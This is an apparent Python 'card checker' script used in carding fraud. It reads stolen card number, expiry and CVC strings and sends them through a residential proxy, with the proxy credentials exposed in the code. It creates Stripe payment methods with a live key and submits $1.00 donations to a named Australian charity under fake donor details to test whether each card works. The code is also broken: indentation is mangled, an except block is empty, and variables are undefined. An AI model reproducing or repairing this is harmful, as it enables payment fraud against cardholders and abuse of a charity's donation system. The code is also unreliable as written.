import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_b7987ef2-zone-mass:gvqtoo4v78v8"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    if "01" in mm or "02" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
        mm = mm.split("0")[1]
    r = requests.session()
    
    random_amount1 = random.randint(1, 3)
    random_amount2 = random.randint(1, 99)

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9,my;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

response = requests.get('https://remember.org.au/donate/', headers=headers)

form_id = re.search(r'name="charitable_form_id" value="(.*?)"',response.text).group(1)
donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"',response.text).group(1)


headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
}

data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F43ae1ea863%3B+stripe-js-v3%2F43ae1ea863%3B+card-element&key=pk_live_51P0v83B09gpyA2Juu5SSq35nUSMyDWVutWv5RAWYv2XeUviqlqhfV5JlBgK64uhOVb0LWcthjR2aJwo5NkNfimZr00g4SiBFrz'

response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

pm = response.json()['id']

headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9,my;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://remember.org.au',
    'Referer': 'https://remember.org.au/donate/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data = {
    'charitable_form_id': f'{form_id}',
    f'{form_id}': '',
    '_charitable_donation_nonce': f'{donation_nonce}',
    '_wp_http_referer': '/donate/',
    'campaign_id': '13890',
    'description': 'Donate',
    'ID': '0',
    'gateway': 'stripe',
    'donation_amount': 'custom',
    'custom_donation_amount': '1.00',
    'title': '',
    'first_name': 'Jee',
    'last_name': 'Pee',
    'email': 'saikhatphaw@gmail.com',
    'phone_type': '0',
    'phone': '297852163',
    'address': '',
    'city': '',
    'state': '0',
    'postcode': '',
    'country': 'AU',
    'donation_reason': '',
    'stripe_payment_method': f'{pm}',
    'action': 'make_donation',
    'form_action': 'make_donation',
}
response = requests.post('https://remember.org.au/wp-admin/admin-ajax.php', headers=headers, data=data)
    
    try:
        result = re.search(r"class='gfield_description validation_message gfield_validation_message'>(.*?)<\/div><\/li>", response.text).group(1)
    except:
    
    

headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
}

data = f'expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51P0v83B09gpyA2Juu5SSq35nUSMyDWVutWv5RAWYv2XeUviqlqhfV5JlBgK64uhOVb0LWcthjR2aJwo5NkNfimZr00g4SiBFrz&client_attribution_metadata[client_session_id]=99c5504b-4435-48e0-82b4-e454a2acd1e1&client_attribution_metadata[merchant_integration_source]=l1&client_secret={scrt}'

response = requests.post(
        f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
        headers=headers,
        data=data,
    )

    return response.text
